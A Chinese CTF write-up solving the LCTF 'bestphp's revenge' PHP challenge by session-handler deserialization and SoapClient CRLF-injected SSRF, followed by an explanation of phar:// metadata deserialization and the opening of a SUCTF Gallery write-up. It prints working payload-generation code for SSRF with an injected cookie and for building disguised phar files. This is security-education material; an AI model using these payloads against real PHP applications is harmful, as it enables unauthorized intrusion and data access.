LCTF的Web题，本菜鸡是感觉难到自闭了，只能来分析下签到题
## bestphp's revenge
这是题目源码
有一个flag.php但要求本地访问  
所以思路其实蛮清晰的，构造反序列化触发SSRF  
问题的关键在于没有可以利用的类，没有可以利用的类就找不到POP链  
所以只能考虑PHP原生类  
其实这道题目就是这个考点——利用PHP原生类来构造POP链，这和N1ctf的一道题是一致的  
但是还有一个点就是如何触发反序列化  
开始想到变量覆盖，通过extract覆盖b为unserialize  
然后再在下面的call_user_func中调用unserialize  
但是a默认为一个数组，这是不可控的，unserialize无法处理数组，所以只能想其它的办法  
然后想到了利用PHP中session反序列化机制的问题来触发反序列化
### PHP session 反序列化机制
在php.ini中存在session.serialize_handler配置，定义用来序列化/反序列化的处理器名字，默认使用php。  
php中的session中的内容是以文件的方式来存储的  
存储方式由配置项session.save_handler确定，默认是以文件的方式存储。  
PHP中session本身的序列化机制是没有问题的  
问题出在了如果在序列化和反序列化时选择的引擎不同，就会带来安全问题  
当使用php引擎的时候，php引擎会以|作为作为key和value的分隔符，对value多进行一次反序列化，达到我们触发反序列化的目的  
具体可以参考 
### 原生类Soap的利用
利用php的原生类soap进行反序列化的姿势是在N1ctf题目中学到的  
SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery
andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService
，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。  
其采用HTTP作为底层通讯协议，XML作为数据传送的格式。  
这里飘零师傅有写过详细的文章，也不赘述了   
简单来讲，我们可以通过它来发送http/https请求，同时，这里的http头部还存在crlf漏洞  
SoapClient类可以创建soap数据报文，与wsdl接口进行交互。  
看一下简单的用法
    'http://example.com:2333','uri'=>'123'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->a();
这样我们就能触发SSRF了  
同时，我们可以通过设置user_agent头来构造CRLF  
这是wupco师傅的poc
     $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=>'hello'));
    $aaa = serialize($b);
    $aaa = str_replace('^^',"\n\r",$aaa);
    echo urlencode($aaa);
### 解题
所以我们可以通过call_user_func来设置session.serialize_handler，然后通过默认引擎来触发反序列化  
反序列化利用的是Soap原生类来触发SSRF到flag.php页面，猜想flag会存储在session中  
首先测试能否触发SSRF，测试是可以的，就直接上解题过程了  
构造payload,这里我们要将cookie添加到header中，所以通过user_agent的Crlf来达到目的
     $target,
                                  'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=8nsujaq7o5tl0btee8urnlsrb3\r\n",
                                  'uri' => "123"));
    $payload = urlencode(serialize($attack));
    echo $payload;
    $c = unserialize(urldecode($payload));
    $c->a();
先本地测试下  
本地是可以成功的  
所以我们要在题目中触发反序列化  
先生成payload
     $target,
                                  'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=8nsujaq7o5tl0btee8urnlsrb3\r\n",
                                  'uri' => "123"));
    $payload = urlencode(serialize($attack));
    echo $payload;
然后通过call_user_func来设置session.serialize_handler  
最后不要忘记构造payload的最后一步是在序列化的值之前加一个`|`  
首先要将我们的payload存储进session  
然后再去触发反序列化  
最后修改cookie为我们设置的SSRF中的cookie查看session,就可以看到flag了  
## 其它
这道题目让我想起了PHP反序列化的另一些拓展  
即关于`phar://`的利用  
同样是很隐蔽的触发反序列化的点  
phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。  
该方法在文件系统函数（file_exists（）、is_dir（）等）参数可控的情况下，配合`phar://`伪协议，可以不依赖unserialize（）直接进行反序列化操作。
### phar文件构成
  * a stub
可以理解为一个标志，格式为xxx，前期内容不限，但必须以**HALT_COMPILER();?>来结尾，否则phar扩展将无法识别其为phar文件。
  * a manifest describing the contents
phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都存放在这一部分中。这部分将会以序列化的形式存储用户自定义的meta-data。
  * the file contents
被压缩文件的内容。
  * a signature for verifying Phar integrity (phar file format only)
签名，放在文件末尾，目前支持的两种签名格式是MD5和SHA1。
### 漏洞利用
漏洞触发点在使用`phar://`协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的meta-data会被反序列化。
meta-data是用serialize()生成并保存在phar文件中，当内核调用phar_parse_metadata()解析meta-data数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。
利用php生成phar文件  
要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。
受影响函数列表  
PHP识别phar文件是通过文件头的stub，即__HALT_COMPILER();?>，对前面的内容或者后缀名没有要求。可以通过添加任意文件头加上修改后缀名的方式将phar文件伪装成其他格式的文件。
exp
    $phar=new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('te.txt','asd');
    #添加压缩文件  
    $phar->setStub('');
    #可以设置其它的文件头来伪造文件类型  
    $o=new test('test');
    #实例化一个对象
    $phar->setMetaData($o);
    #存入头
    $phar->stopBuffering();
    #计算签名
前几天suctf的招新题刚好能用来当实例
### Gallery
刚好题目环境还在   
直接放上当时写的wp  
上传点简单猜测，暂时没法绕过  
swp源码泄露
    upload_pic();
                }
                break;
            }
            case 'get':{
                print $manager->get_pic($_GET['pic']);
                exit;
            }
            case 'clean':{
                $manager->clean();
                break;
            }
            default:{
                break;
            }
        }